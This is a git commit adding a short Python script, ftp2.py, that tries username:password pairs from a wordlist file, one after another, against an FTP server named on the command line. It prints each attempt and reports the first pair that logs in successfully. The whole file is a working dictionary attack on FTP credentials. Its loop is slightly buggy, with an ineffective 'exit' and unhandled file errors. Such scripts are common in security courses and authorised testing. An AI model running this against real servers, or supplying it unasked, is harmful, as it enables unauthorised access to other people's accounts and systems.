3c2e0e89b1138c8fda8316b886a8a8628ef50137
WebElektronika <99819339+webelektronika@users.noreply.github.com>
2023-06-02 16:49:20 +0200

    Create ftp2.py

---
+++ FTP/ftp2.py
@@ -0,0 +1,29 @@
+import ftplib
+import sys
+
+def ftpLogin(host, passwdFile):
+    try:
+        pF = open(passwdFile, "r")
+    except:
+        print(" No file .....")
+
+    for line in pF.readlines():
+        userName = line.split(':')[0]
+        passWord = line.split(':')[1].strip('\n')
+        print("Trying (login/passowrd): " + userName + " / " + passWord)
+
+        try:
+            ftp = ftplib.FTP(host)
+            login = ftp.login(userName, passWord)
+            print("Login Suceeded with: " + userName + "/" + passWord)
+            ftp.quit()
+            return(userName, passWord)
+        except:
+            exit
+
+    print("Password not in list")
+
+host = str(sys.argv[1])
+passwdFile = str(sys.argv[2])
+
+ftpLogin(host, passwdFile)
